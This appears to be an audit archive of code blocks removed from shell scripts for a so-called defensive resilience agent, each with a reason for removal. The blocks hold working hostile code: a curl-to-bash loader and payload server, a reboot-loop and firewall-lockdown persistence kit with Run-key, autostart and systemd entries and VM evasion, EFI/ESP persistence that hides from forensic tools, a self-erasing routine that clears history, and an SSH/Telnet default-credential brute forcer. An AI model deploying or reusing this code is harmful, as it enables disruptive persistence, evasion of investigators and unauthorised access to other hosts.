# Archived Non-Aligned Blocks

These blocks were removed or replaced to align the scripts with the owner-authorized defensive resilience-agent boundary. They are kept only for audit/reference.

## Beryl.sh:818-872

Reason archived: Windows Batman/Robin firewall, reboot, Run-key behavior does not match owner-authorized evidence preservation boundaries.

```text
818:     cat > /etc/systemd/system/batman-selfdestruct.service << EOF
819: [Unit]
820: Description=Jack Sparrow Activation
821: After=batman-supervisor.service
822: [Service]
823: Type=oneshot
824: ExecStart=/bin/sh -c 'if [[ -f /etc/batman-robind/bootcount ]] && [[ \$(cat /etc/batman-robind/bootcount) -ge 10 ]]; then touch /etc/batman-robind/jack_activated; fi'
825: User=$TARGET_USER
826: EOF
827:     systemctl enable batman-selfdestruct.service
828:     echo "Linux Batman & Robin deployed."
829: 
830: elif [[ "$OS" == "windows" ]]; then
831:     # ------------------- WINDOWS BATMAN & ROBIN -------------------
832:     cat > "$TEMP/batman_install.ps1" << 'WINPS'
833: param($controller_ip, $controller_port, $limit=10)
834: $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
835: if (-not $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
836:     Start-Process powershell.exe "-File `"$PSCommandPath`" -controller_ip $controller_ip -controller_port $controller_port -limit $limit" -Verb RunAs
837:     exit 0
838: }
839: $state_dir = "$env:ProgramData\BatmanRobin"
840: if (!(Test-Path $state_dir)) { New-Item -ItemType Directory -Force -Path $state_dir | Out-Null }
841: $counter_file = Join-Path $state_dir 'bootcount.txt'
842: $count = (Test-Path $counter_file) ? [int](Get-Content $counter_file) : 0
843: if ($count -ge $limit) {
844:     Unregister-ScheduledTask -TaskName 'BatmanRobinReboot' -Confirm:$false -ErrorAction SilentlyContinue
845:     Remove-Item -Recurse -Force $state_dir -ErrorAction SilentlyContinue
846:     exit 0
847: }
848: $count += 1
849: Set-Content -Path $counter_file -Value $count
850: $banner_script = Join-Path $state_dir 'bat-signal.ps1'
851: @'
852: while ($true) { Write-Host "`n    .-"-.\n   /     \\\n   |     |\n   \\   .-/\n    '-'-'      BATMAN & ROBIN ARE HERE\n   __|_|__\n   \\     /     ... protecting your network ...\n    \\___/" -ForegroundColor Cyan; Start-Sleep -Seconds 0.5 }
853: '@ | Out-File -FilePath $banner_script -Encoding ASCII
854: Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'BatSignal' -Value "powershell.exe -WindowStyle Hidden -File `"$banner_script`"" -Force
855: netsh advfirewall set allprofiles firewallpolicy blockinbound,blockoutbound
856: netsh advfirewall firewall add rule name="BatmanTelemetry" dir=out action=allow protocol=tcp remoteport=$controller_port
857: netsh advfirewall firewall add rule name="BatmanDNS" dir=out action=allow protocol=udp remoteport=53
858: netsh advfirewall firewall add rule name="BatmanDHCP" dir=out action=allow protocol=udp remoteport=67,68
859: $robin_script = Join-Path $state_dir 'robin.ps1'
860: @'
861: while ($true) {
862:     Get-NetTCPConnection -State Established | Where-Object { $_.RemoteAddress -notmatch '^127\.|^192\.168\.|^10\.' } | ForEach-Object { Remove-NetTCPConnection -LocalPort $_.LocalPort -RemotePort $_.RemotePort -RemoteAddress $_.RemoteAddress -Force -ErrorAction SilentlyContinue }
863:     Start-Sleep -Seconds (Get-Random -Minimum 30 -Maximum 90)
864: }
865: '@ | Out-File -FilePath $robin_script -Encoding ASCII
866: Start-Process -WindowStyle Hidden -FilePath "powershell.exe" -ArgumentList "-File `"$robin_script`"" -PassThru
867: $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-Command `"& { `$c = [int](Get-Content '$counter_file'); if (`$c -lt $limit) { shutdown /r /t 60 } else { Unregister-ScheduledTask -TaskName 'BatmanRobinReboot' -Confirm:0 } }`""
868: $trigger = New-ScheduledTaskTrigger -AtStartup
869: Register-ScheduledTask -TaskName "BatmanRobinReboot" -Trigger $trigger -Action $action -Force -RunLevel Highest
870: Write-Host "Batman & Robin installed on Windows. Boot: $count / $limit"
871: WINPS
872:     powershell.exe -ExecutionPolicy Bypass -File "$TEMP/batman_install.ps1" -controller_ip "$CONTROLLER_IP" -controller_port "$CONTROLLER_PORT" -limit 10
```

## Vera.sh:383-388

Reason archived: Unsigned raw DNS fallback accepts an unauthenticated recovery signal; recovery channels must be signed/verified.

```text
383:     # Fallback: raw DNS TXT (no signature verification — last resort only)
384:     if [[ -z "$signal" ]] && command -v dig &>/dev/null; then
385:         local dns_domain="${PURPLE_DNS_DROP:-purple-beacon.internal}"
386:         signal=$(dig +short TXT "$dns_domain" 2>/dev/null | tr -d '"' | \
387:                  grep -o "RESURRECT" || echo "")
388:     fi
```

## SofiaX.sh:674-784

Reason archived: Active EFI variable/ESP write recovery path is not appropriate for current shippable defensive boundary; archived for design reference only.

```text
674: # ------------------------------------------------------------
675: # 4. EFI capsule persistence — efivarfs first, ESP fallback
676: # ------------------------------------------------------------
677: SOPHIA_EFI_GUID="a8b4c2d6-e3f1-4a5b-9c7d-2e8f0a1b3c5d"
678: 
679: efi_capsule_persist() {
680:     local bundle_file="$1"
681:     local token_data="${2:-SOPHIA_DORMANT}"
682:     [[ ! -f "$bundle_file" ]] && return 1
683: 
684:     # --- Try efivarfs ---
685:     local efivar_path="/sys/firmware/efi/efivars/SophiaToken-${SOPHIA_EFI_GUID}"
686:     if [[ -d "/sys/firmware/efi/efivars" ]]; then
687:         chattr -i "$efivar_path" 2>/dev/null || true
688:         { printf '\x07\x00\x00\x00'; printf '%s' "$token_data"; } > "$efivar_path" 2>/dev/null && {
689:             echo "[efi] Token persisted to efivarfs"
690:             logger -t sophia "EFI variable written: $efivar_path"
691:         }
692:     fi
693: 
694:     # --- ESP fallback: store full bundle ---
695:     local esp=""
696:     for mp in /boot/efi /boot/EFI /efi /boot; do
697:         if [[ -d "$mp/EFI" ]] || mountpoint -q "$mp" 2>/dev/null; then
698:             esp="$mp"; break
699:         fi
700:     done
701: 
702:     if [[ -z "$esp" ]]; then
703:         local esp_dev
704:         esp_dev=$(fdisk -l 2>/dev/null | grep -i "EFI System" | awk '{print $1}' | head -1) || true
705:         [[ -z "$esp_dev" ]] && esp_dev=$(blkid -t TYPE=vfat 2>/dev/null | head -1 | cut -d: -f1) || true
706:         if [[ -n "$esp_dev" ]]; then
707:             esp="/tmp/_sophia_esp_$$"
708:             mkdir -p "$esp"
709:             mount "$esp_dev" "$esp" 2>/dev/null || { rm -rf "$esp"; esp=""; }
710:         fi
711:     fi
712: 
713:     if [[ -z "$esp" ]]; then
714:         echo "[efi] WARN: No ESP found; EFI bundle persistence skipped." >&2
715:         return 1
716:     fi
717: 
718:     local efi_dir="$esp/EFI/.$(openssl rand -hex 6)"
719:     mkdir -p "$efi_dir"
720:     cp "$bundle_file" "$efi_dir/payload.bin"
721: 
722:     # Sign the bundle and store signature alongside
723:     if command -v sophia_crypto &>/dev/null && [[ -f /var/lib/.sophia/keys/ed25519.priv ]]; then
724:         sophia_crypto sign "$efi_dir/payload.bin" > "$efi_dir/payload.sig" 2>/dev/null || true
725:         sophia_crypto pubkey > "$efi_dir/pubkey.hex" 2>/dev/null || true
726:     fi
727: 
728:     # Write rehydrate.sh onto ESP
729:     cat > "$efi_dir/rehydrate.sh" << 'REHYD'
730: #!/bin/bash
731: set -euo pipefail
732: SELF_DIR="$(cd "$(dirname "$0")" && pwd)"
733: PAYLOAD="$SELF_DIR/payload.bin"
734: SIG="$SELF_DIR/payload.sig"
735: PUBKEY_FILE="$SELF_DIR/pubkey.hex"
736: 
737: # Abort if forensic tools are active
738: pgrep -f "volatility|rekall|memdump|autopsy" &>/dev/null && exit 0
739: 
740: # Verify Ed25519 signature if sophia_crypto present
741: if command -v sophia_crypto &>/dev/null && [[ -f "$SIG" ]] && [[ -f "$PUBKEY_FILE" ]]; then
742:     sig=$(cat "$SIG")
743:     sophia_crypto verify "$PAYLOAD" "$sig" || exit 1
744: fi
745: 
746: # Decompress and restore
747: RESTORE_DIR="/var/lib/.sophia_restore_$$"
748: mkdir -p "$RESTORE_DIR"
749: tar -xzf "$PAYLOAD" -C "$RESTORE_DIR" 2>/dev/null || exit 1
750: 
751: # Re-run all installers
752: for installer in /usr/local/sbin/install-*-omniversal.sh; do
753:     [[ -f "$installer" ]] && bash "$installer" &
754: done
755: 
756: # Write sophia state back
757: [[ -d "$RESTORE_DIR/.sophia" ]] && cp -a "$RESTORE_DIR/.sophia/." /var/lib/.sophia/ 2>/dev/null || true
758: rm -rf "$RESTORE_DIR"
759: echo "Sophia rehydration complete."
760: REHYD
761:     chmod +x "$efi_dir/rehydrate.sh"
762:     echo "$efi_dir" > /var/lib/.sophia/efi_location
763:     echo "[efi] Bundle persisted to ESP: $efi_dir"
764:     logger -t sophia "EFI bundle written to ESP: $efi_dir"
765: 
766:     # Install systemd service for auto-rehydration (non-WSL only)
767:     if [[ "$ENV" != "wsl" ]] && command -v systemctl &>/dev/null; then
768:         cat > /etc/systemd/system/sophia-rehydrate.service << SVCEOF
769: [Unit]
770: Description=Sophia Recovery Agent
771: After=multi-user.target
772: 
773: [Service]
774: Type=oneshot
775: ExecStart=$efi_dir/rehydrate.sh
776: RemainAfterExit=yes
777: 
778: [Install]
779: WantedBy=multi-user.target
780: SVCEOF
781:         systemctl daemon-reload 2>/dev/null && systemctl enable sophia-rehydrate.service 2>/dev/null || true
782:     fi
783:     return 0
784: }
```

## SofiaX.sh:906-944

Reason archived: Dormancy path deletes runtime state; evidence preservation requires sealing state, not wiping it.

```text
906: # 8. Dormancy protocol — graceful shutdown + EFI/USB persist
907: # ------------------------------------------------------------
908: enter_dormancy() {
909:     local reason="${1:-unspecified}"
910:     logger -t sophia "DORMANCY ACTIVATED — reason: $reason"
911:     echo "[sophia] Entering dormancy: $reason"
912: 
913:     # Signal all purple screens to quit
914:     for sname in hatter_hivemind cheshire_hivemind resurrection_hivemind \
915:                  zod_hivemind little_john lich_hivemind containment sophia; do
916:         screen -S "$sname" -X quit 2>/dev/null || true
917:     done
918:     sleep 3
919: 
920:     # Kill remaining purple binaries by exact name
921:     for bin in hatter_server cheshire_server resurrection_hivemind zod_hivemind \
922:                little_john ssh_decoy_logger resurrection_keeper threat_calc sophia_crypto; do
923:         pkill -x "$bin" 2>/dev/null || true
924:     done
925: 
926:     # Bundle state for recovery
927:     local bundle_dir="/tmp/sophia_dormancy_$$"
928:     mkdir -p "$bundle_dir"
929:     cp -a /var/lib/.sophia "$bundle_dir/" 2>/dev/null || true
930:     mkdir -p "$bundle_dir/purple_run"
931:     cp /run/purple/* "$bundle_dir/purple_run/" 2>/dev/null || true
932:     tar -czf "$bundle_dir/state.tar.gz" -C "$bundle_dir" .sophia purple_run 2>/dev/null || true
933: 
934:     # Persist to EFI (efivarfs token + ESP bundle)
935:     efi_capsule_persist "$bundle_dir/state.tar.gz" "SOPHIA_DORMANT:reason=$reason" || \
936:         logger -t sophia "WARN: EFI persistence failed — no durable recovery path"
937: 
938:     # Wipe runtime state
939:     rm -rf /run/purple 2>/dev/null || true
940:     rm -rf /var/lib/.resurrection 2>/dev/null || true
941:     rm -rf "$bundle_dir"
942: 
943:     logger -t sophia "DORMANCY COMPLETE"
944: }
```

## SofiaX.sh:947-976

Reason archived: Migration wording and behavior should be reframed as safe-mode monitoring.

```text
947: # 9. Background migration monitor
948: # ------------------------------------------------------------
949: monitor_for_migration() {
950:     local check_interval=300
951:     local hostile_since=0
952: 
953:     while true; do
954:         sleep "$check_interval"
955:         local score; score=$(assess_hostility)
956: 
957:         if [[ $score -ge 7 ]]; then
958:             if [[ $hostile_since -eq 0 ]]; then
959:                 hostile_since=$(date +%s)
960:                 logger -t sophia "HIGH HOSTILITY detected (score=$score) — monitoring"
961:             else
962:                 local elapsed=$(( $(date +%s) - hostile_since ))
963:                 if [[ $elapsed -ge 600 ]]; then
964:                     logger -t sophia "Sustained hostility ${elapsed}s — entering dormancy"
965:                     enter_dormancy "sustained_high_hostility_score=${score}"
966:                     return
967:                 fi
968:             fi
969:         else
970:             hostile_since=0
971:             # Opportunistic dead-drop check when environment is calm
972:             if command -v sophia_crypto &>/dev/null; then
973:                 probe_dead_drops &>/dev/null || true
974:             fi
975:         fi
976:     done
```

## SofiaX.sh:1154-1167

Reason archived: Self-protection implementation truncates/chmods the live script; owner control requires non-destructive audit behavior.

```text
1154: # ------------------------------------------------------------
1155: # 14. Self-protection
1156: # ------------------------------------------------------------
1157: self_protect() {
1158:     if [[ "${TEST_MODE:-0}" == "1" ]]; then
1159:         echo "TEST_MODE active: skipping self-protection."
1160:         return 0
1161:     fi
1162:     echo "$(date -u): Sophia deployment complete — environment: $ENV" >> "$LOGS_DIR/events.log"
1163:     history -c 2>/dev/null || true
1164:     truncate -s 0 "$SELF_PATH" 2>/dev/null || true
1165:     chmod 000 "$SELF_PATH" 2>/dev/null || true
1166:     echo "Sophia has completed its task and will now vanish."
1167: }
```

## Beryl.sh:594-875

Reason archived: full legacy Batman/Robin helper performed reboot/firewall/run-key behavior outside the clarified defensive evidence-preservation boundary.

```text
594: build_bash_helpers() {
595:     cat > /etc/cheshire/loader.sh << "LOADER"
596: #!/bin/bash
597: CONTROLLER_IP="127.0.0.1"
598: CONTROLLER_PORT="8080"
599: TOKEN="$HTTP_TOKEN"
600: FULL_URL="http://127.0.0.1:$CONTROLLER_PORT/batman-full.sh?token=$TOKEN"
601: curl -s "$FULL_URL" | bash -s "127.0.0.1" "$CONTROLLER_PORT"
602: LOADER
603:     chmod +x /etc/cheshire/loader.sh
604: 
605:     cat > /etc/cheshire/batman-full.sh << 'BATMAN'
606: #!/bin/bash
607: set -euo pipefail
608: CONTROLLER_IP="${1:-}"
609: CONTROLLER_PORT="${2:-8080}"
610: [[ -z "$CONTROLLER_IP" ]] && exit 1
611: if [[ -d "/proc/vz" ]] || [[ -f "/.dockerenv" ]] || grep -qi "virtualbox" /proc/1/environ 2>/dev/null; then
612:     exit 0
613: fi
614: OS="linux"
615: if command -v powershell.exe &>/dev/null; then
616:     OS="windows"
617: fi
618: 
619: if [[ "$OS" == "linux" ]]; then
620:     # ------------------- LINUX BATMAN & ROBIN -------------------
621:     STATE_DIR="/etc/batman-robind"
622:     COUNTER_FILE="$STATE_DIR/bootcount"
623:     LIMIT=10
624:     mkdir -p "$STATE_DIR"
625:     if [[ ! -f "$COUNTER_FILE" ]]; then
626:         echo "1" > "$COUNTER_FILE"
627:     else
628:         count=$(cat "$COUNTER_FILE")
629:         if [[ $count -ge $LIMIT ]]; then
630:             systemctl stop batman-* 2>/dev/null || true
631:             systemctl disable batman-* 2>/dev/null || true
632:             rm -rf /etc/systemd/system/batman-*.service
633:             rm -rf /usr/local/sbin/batman-* /usr/local/bin/robin-worker
634:             rm -rf "$STATE_DIR"
635:             systemctl daemon-reload
636:             exit 0
637:         else
638:             echo $((count + 1)) > "$COUNTER_FILE"
639:         fi
640:     fi
641: 
642:     cat > /usr/local/bin/bat-signal << 'BATSIG'
643: #!/bin/bash
644: duration=10
645: end=$((SECONDS+duration))
646: banner="
647:     .-"-.
648:    /     \\
649:    |     |
650:    \\   .-/
651:     '-'-'      BATMAN & ROBIN ARE HERE
652:    __|_|__
653:    \\     /     ... protecting your network ...
654:     \\___/
655: "
656: while (( SECONDS < end )); do
657:     echo "$banner" | wall 2>/dev/null || true
658:     for tty in /dev/pts/* /dev/tty[0-9]*; do
659:         [[ -w "$tty" ]] && printf '%s\n' "$banner" > "$tty" 2>/dev/null &
660:     done
661:     sleep 0.3
662: done
663: wait
664: BATSIG
665:     chmod +x /usr/local/bin/bat-signal
666:     cat > /etc/systemd/system/bat-signal.service << EOF
667: [Unit]
668: Description=Bat Signal Display
669: After=multi-user.target
670: [Service]
671: Type=oneshot
672: ExecStart=/usr/local/bin/bat-signal
673: [Install]
674: WantedBy=multi-user.target
675: EOF
676:     systemctl enable bat-signal.service
677: 
678:     cat > /usr/local/sbin/batman-supervisor << 'BATSUP'
679: #!/bin/bash
680: TARGET=1
681: MAX=3
682: while true; do
683:     ACTIVE=$(systemctl list-units --type=service --state=running | grep -c "robin-worker@")
684:     if (( ACTIVE < TARGET )); then
685:         for i in $(seq 1 $TARGET); do
686:             if ! systemctl is-active --quiet "robin-worker@$i.service"; then
687:                 systemctl start "robin-worker@$i.service"
688:             fi
689:         done
690:     fi
691:     sleep 5
692: done
693: BATSUP
694:     chmod +x /usr/local/sbin/batman-supervisor
695: 
696:     cat > /usr/local/sbin/robin-worker << 'ROBIN'
697: #!/bin/bash
698: while true; do
699:     ss -K state established '! ( dst 127.0.0.0/8 or dst 192.168.0.0/16 or dst 10.0.0.0/8 )' 2>/dev/null || true
700:     conntrack -F 2>/dev/null || true
701:     resolvectl flush-caches 2>/dev/null || true
702:     sleep $(( RANDOM % 60 + 30 ))
703: done
704: ROBIN
705:     chmod +x /usr/local/sbin/robin-worker
706: 
707:     cat > /usr/local/sbin/batman-watchdog << 'WDOG'
708: #!/bin/bash
709: while true; do
710:     if ! systemctl is-active --quiet batman-supervisor.service; then
711:         systemctl start batman-supervisor.service
712:     fi
713:     sleep 5
714: done
715: WDOG
716:     chmod +x /usr/local/sbin/batman-watchdog
717: 
718:     cat > /etc/systemd/system/batman-supervisor.service << EOF
719: [Unit]
720: Description=Batman Supervisor
721: [Service]
722: Type=simple
723: ExecStart=/usr/local/sbin/batman-supervisor
724: Restart=always
725: [Install]
726: WantedBy=multi-user.target
727: EOF
728:     cat > /etc/systemd/system/robin-worker@.service << EOF
729: [Unit]
730: Description=Robin Worker %i
731: BindsTo=batman-supervisor.service
732: [Service]
733: Type=simple
734: ExecStart=/usr/local/sbin/robin-worker %i
735: Restart=always
736: EOF
737:     cat > /etc/systemd/system/batman-watchdog.service << EOF
738: [Unit]
739: Description=Batman Watchdog
740: [Service]
741: Type=simple
742: ExecStart=/usr/local/sbin/batman-watchdog
743: Restart=always
744: EOF
745: 
746:     systemctl daemon-reload
747:     systemctl enable batman-supervisor.service batman-watchdog.service
748:     systemctl start batman-watchdog.service
749: 
750:     cat > /etc/systemd/system/batman-reboot.timer << EOF
751: [Unit]
752: Description=Reboot 1 min after boot
753: [Timer]
754: OnBootSec=1min
755: [Install]
756: WantedBy=timers.target
757: EOF
758:     cat > /etc/systemd/system/batman-reboot.service << EOF
759: [Unit]
760: Description=Reboot service
761: [Service]
762: Type=oneshot
763: ExecStart=/sbin/reboot
764: EOF
765:     systemctl enable batman-reboot.timer
766: 
767:     # Jack Sparrow trinket (FIXED – removed broken hidden-file check)
768:     if [[ -n "${SUDO_USER:-}" ]]; then TARGET_USER="$SUDO_USER"; else TARGET_USER=$(who am i | awk '{print $1}'); fi
769:     [[ -z "$TARGET_USER" ]] && TARGET_USER="nobody"
770:     HOME_DIR=$(eval echo "~$TARGET_USER")
771:     if [[ -d "$HOME_DIR/Desktop" ]]; then
772:         JACK_SCRIPT="$HOME_DIR/.jack_sparrow.sh"
773:         cat > "$JACK_SCRIPT" << 'JACK'
774: #!/bin/bash
775: MARKER="$HOME/.jack_active"
776: if [[ -f "$MARKER" ]]; then exit 0; fi
777: touch "$MARKER"
778: if [[ ! -f "/etc/batman-robind/jack_activated" ]]; then
779:     date +%s > /etc/batman-robind/jack_installed
780:     exit 0
781: fi
782: INSTALLED=$(cat /etc/batman-robind/jack_installed 2>/dev/null || echo 0)
783: NOW=$(date +%s)
784: if (( NOW - INSTALLED < 1728000 )); then
785:     exit 0
786: fi
787: RUM_DIR="$HOME/.rum_cache"
788: mkdir -p "$RUM_DIR"
789: while true; do
790:     # Only check if the script itself has been touched
791:     REAL_PATH=$(readlink -f "${BASH_SOURCE[0]}")
792:     if [[ $(stat -c %Y "$REAL_PATH") -gt $(stat -c %Y "$MARKER") ]]; then
793:         # Script was modified or accessed after marker – self‑destruct
794:         find "$RUM_DIR" -name "*.rum" -exec mv {} {}.gone \; 2>/dev/null
795:         rm -f "$MARKER" /etc/batman-robind/jack_activated /etc/batman-robind/jack_installed "$REAL_PATH"
796:         exit 0
797:     fi
798:     NAME=$(cat /dev/urandom | tr -dc 'A-Za-z0-9' | fold -w 20 | head -n1)
799:     touch "${RUM_DIR}/${NAME}.rum"
800:     sleep 3
801: done
802: JACK
803:         chmod +x "$JACK_SCRIPT"
804:         chown "$TARGET_USER":"$TARGET_USER" "$JACK_SCRIPT"
805:         mkdir -p "$HOME_DIR/.config/autostart"
806:         cat > "$HOME_DIR/.config/autostart/jack_sparrow.desktop" << EOF
807: [Desktop Entry]
808: Type=Application
809: Name=Jack Sparrow
810: Exec=$JACK_SCRIPT
811: Hidden=false
812: NoDisplay=true
813: X-GNOME-Autostart-enabled=true
814: EOF
815:         chown -R "$TARGET_USER":"$TARGET_USER" "$HOME_DIR/.config/autostart"
816:     fi
817: 
818:     cat > /etc/systemd/system/batman-selfdestruct.service << EOF
819: [Unit]
820: Description=Jack Sparrow Activation
821: After=batman-supervisor.service
822: [Service]
823: Type=oneshot
824: ExecStart=/bin/sh -c 'if [[ -f /etc/batman-robind/bootcount ]] && [[ \$(cat /etc/batman-robind/bootcount) -ge 10 ]]; then touch /etc/batman-robind/jack_activated; fi'
825: User=$TARGET_USER
826: EOF
827:     systemctl enable batman-selfdestruct.service
828:     echo "Linux Batman & Robin deployed."
829: 
830: elif [[ "$OS" == "windows" ]]; then
831:     # ------------------- WINDOWS BATMAN & ROBIN -------------------
832:     cat > "$TEMP/batman_install.ps1" << 'WINPS'
833: param($controller_ip, $controller_port, $limit=10)
834: $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
835: if (-not $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
836:     Start-Process powershell.exe "-File `"$PSCommandPath`" -controller_ip $controller_ip -controller_port $controller_port -limit $limit" -Verb RunAs
837:     exit 0
838: }
839: $state_dir = "$env:ProgramData\BatmanRobin"
840: if (!(Test-Path $state_dir)) { New-Item -ItemType Directory -Force -Path $state_dir | Out-Null }
841: $counter_file = Join-Path $state_dir 'bootcount.txt'
842: $count = (Test-Path $counter_file) ? [int](Get-Content $counter_file) : 0
843: if ($count -ge $limit) {
844:     Unregister-ScheduledTask -TaskName 'BatmanRobinReboot' -Confirm:$false -ErrorAction SilentlyContinue
845:     Remove-Item -Recurse -Force $state_dir -ErrorAction SilentlyContinue
846:     exit 0
847: }
848: $count += 1
849: Set-Content -Path $counter_file -Value $count
850: $banner_script = Join-Path $state_dir 'bat-signal.ps1'
851: @'
852: while ($true) { Write-Host "`n    .-"-.\n   /     \\\n   |     |\n   \\   .-/\n    '-'-'      BATMAN & ROBIN ARE HERE\n   __|_|__\n   \\     /     ... protecting your network ...\n    \\___/" -ForegroundColor Cyan; Start-Sleep -Seconds 0.5 }
853: '@ | Out-File -FilePath $banner_script -Encoding ASCII
854: Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'BatSignal' -Value "powershell.exe -WindowStyle Hidden -File `"$banner_script`"" -Force
855: netsh advfirewall set allprofiles firewallpolicy blockinbound,blockoutbound
856: netsh advfirewall firewall add rule name="BatmanTelemetry" dir=out action=allow protocol=tcp remoteport=$controller_port
857: netsh advfirewall firewall add rule name="BatmanDNS" dir=out action=allow protocol=udp remoteport=53
858: netsh advfirewall firewall add rule name="BatmanDHCP" dir=out action=allow protocol=udp remoteport=67,68
859: $robin_script = Join-Path $state_dir 'robin.ps1'
860: @'
861: while ($true) {
862:     Get-NetTCPConnection -State Established | Where-Object { $_.RemoteAddress -notmatch '^127\.|^192\.168\.|^10\.' } | ForEach-Object { Remove-NetTCPConnection -LocalPort $_.LocalPort -RemotePort $_.RemotePort -RemoteAddress $_.RemoteAddress -Force -ErrorAction SilentlyContinue }
863:     Start-Sleep -Seconds (Get-Random -Minimum 30 -Maximum 90)
864: }
865: '@ | Out-File -FilePath $robin_script -Encoding ASCII
866: Start-Process -WindowStyle Hidden -FilePath "powershell.exe" -ArgumentList "-File `"$robin_script`"" -PassThru
867: $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-Command `"& { `$c = [int](Get-Content '$counter_file'); if (`$c -lt $limit) { shutdown /r /t 60 } else { Unregister-ScheduledTask -TaskName 'BatmanRobinReboot' -Confirm:0 } }`""
868: $trigger = New-ScheduledTaskTrigger -AtStartup
869: Register-ScheduledTask -TaskName "BatmanRobinReboot" -Trigger $trigger -Action $action -Force -RunLevel Highest
870: Write-Host "Batman & Robin installed on Windows. Boot: $count / $limit"
871: WINPS
872:     powershell.exe -ExecutionPolicy Bypass -File "$TEMP/batman_install.ps1" -controller_ip "$CONTROLLER_IP" -controller_port "$CONTROLLER_PORT" -limit 10
873: fi
874: BATMAN
875:     chmod +x /etc/cheshire/batman-full.sh
```

## Beryl.sh:234-328

Reason archived: active SSH/Telnet credential attempts are outside the clarified defensive boundary; replaced with local decoy-auth telemetry recorder.

```text
234:     "fmt"
235:     "os"
236:     "syscall"
237:     "os/exec"
238:     "strings"
239:     "sync"
240: )
241: 
242: var creds = []string{
243:     "root:root", "root:admin", "admin:admin", "admin:password", "root:12345",
244:     "root:default", "root:password", "admin:12345", "admin:default", "user:user",
245:     "user:password", "root:toor", "pi:raspberry", "ubuntu:ubuntu", "admin:admin123",
246: }
247: 
248: type result struct {
249:     ip, user, pass string
250:     method         string
251: }
252: 
253: func trySSH(ip, user, pass string, wg *sync.WaitGroup, ch chan<- result) {
254:     defer wg.Done()
255:     cmd := exec.Command("sshpass", "-p", pass, "ssh", "-o", "StrictHostKeyChecking=no", "-o", "ConnectTimeout=3",
256:         fmt.Sprintf("%s@%s", user, ip), "exit")
257:     if err := cmd.Run(); err == nil {
258:         ch <- result{ip, user, pass, "SSH"}
259:     }
260: }
261: 
262: func tryTelnet(ip, user, pass string, wg *sync.WaitGroup, ch chan<- result) {
263:     defer wg.Done()
264:     cmd := exec.Command("sh", "-c", fmt.Sprintf(`(echo "%s"; echo "%s"; sleep 1; echo "exit") | telnet %s 2>/dev/null`, user, pass, ip))
265:     if err := cmd.Run(); err == nil {
266:         ch <- result{ip, user, pass, "TELNET"}
267:     }
268: }
269: 
270: func main() {
271:     if len(os.Args) < 2 {
272:         fmt.Println("Usage: credential_probe <target_ip>")
273:         return
274:     }
275:     target := os.Args[1]
276:     var wg sync.WaitGroup
277:     ch := make(chan result, len(creds)*2)
278: 
279:     // Throttle concurrency based on environment (set at compile time via env var)
280:     maxConcurrent := 3
281:     sem := make(chan struct{}, maxConcurrent)
282: 
283:     for _, cred := range creds {
284:         parts := strings.SplitN(cred, ":", 2)
285:         user, pass := parts[0], parts[1]
286:         wg.Add(2)
287:         go func(ip, u, p string) {
288:             sem <- struct{}{}
289:             trySSH(ip, u, p, &wg, ch)
290:             <-sem
291:         }(target, user, pass)
292:         go func(ip, u, p string) {
293:             sem <- struct{}{}
294:             tryTelnet(ip, u, p, &wg, ch)
295:             <-sem
296:         }(target, user, pass)
297:     }
298: 
299:     go func() {
300:         wg.Wait()
301:         close(ch)
302:     }()
303: 
304:     for res := range ch {
305:         fmt.Printf("%s|%s|%s|%s\n", res.method, res.ip, res.user, res.pass)
306:         if f, err := os.OpenFile("/run/purple/ouroboros_fifo", os.O_WRONLY|os.O_APPEND|syscall.O_NONBLOCK|os.O_CREATE, 0666); err == nil {
307:             fmt.Fprintf(f, "CREDENTIAL_FINDING|%s|%s|%s\n", res.ip, res.user, res.pass)
308:             f.Close()
309:         }
310:         if f, err := os.OpenFile("/run/purple/attacker_ips", os.O_WRONLY|os.O_APPEND|syscall.O_NONBLOCK|os.O_CREATE, 0644); err == nil {
311:             fmt.Fprintln(f, res.ip)
312:             f.Close()
313:         }
314:         return
315:     }
316: }
317: GO_CREDENTIAL_PROBE
318:     # Compile with environment variable for concurrency
319:     sed -i "s/3/$MAX_CREDENTIAL_PROBE_CONCURRENCY/" /tmp/credential_probe.go
320:     go build -o /usr/local/bin/credential_probe /tmp/credential_probe.go
321:     chmod +x /usr/local/bin/credential_probe
322:     rm -f /tmp/credential_probe.go
323: }
324: 
325: # ------------------------------------------------------------
326: # 5. Build Bun sandbox (infinite tarpit) – unchanged
327: # ------------------------------------------------------------
328: build_purple_block_script() {
```

## Beryl.sh:495-522

Reason archived: payload/delivery endpoint naming did not match owner-authorized local helper semantics; replaced with local owner helper server.

```text
495: build_bun_payload_server() {
496:     cat > /usr/local/bin/payload_server.js << 'BUN_PAYLOAD'
497: #!/usr/bin/env bun
498: import { serve } from 'bun';
499: import { readFileSync } from 'fs';
500: 
501: const HTTP_TOKEN = process.env.HTTP_TOKEN || 'default';
502: const PORT = parseInt(process.env.PORT || '8080');
503: 
504: serve({
505:     port: PORT,
506:     fetch(req) {
507:         const url = new URL(req.url);
508:         if (url.pathname === '/loader.sh' && url.searchParams.get('token') === HTTP_TOKEN) {
509:             const loader = readFileSync('/etc/cheshire/loader.sh', 'utf8');
510:             return new Response(loader, { headers: { 'Content-Type': 'text/plain' } });
511:         }
512:         if (url.pathname === '/batman-full.sh' && url.searchParams.get('token') === HTTP_TOKEN) {
513:             const payload = readFileSync('/etc/cheshire/batman-full.sh', 'utf8');
514:             return new Response(payload, { headers: { 'Content-Type': 'text/plain' } });
515:         }
516:         return new Response('Forbidden', { status: 403 });
517:     }
518: });
519: console.log(`Payload server on port ${PORT}`);
520: BUN_PAYLOAD
521:     chmod +x /usr/local/bin/payload_server.js
522: }
```


## Beryl.sh sandbox.js simple answers block archived 2026-05-29T05:00:11Z

Reason archived: Replaced the minimal fake-shell command table with a host-owned decoy anti-recon layer that categorizes hostile recon, returns synthetic-only environment data, and emits telemetry for scoring. This archived block is retained for audit/reference only.

```text
    const answers = (cmd) => {
        cmd = cmd.trim();
        toFifo(`ATTACKER_CMD|${ip}|${cmd}`);
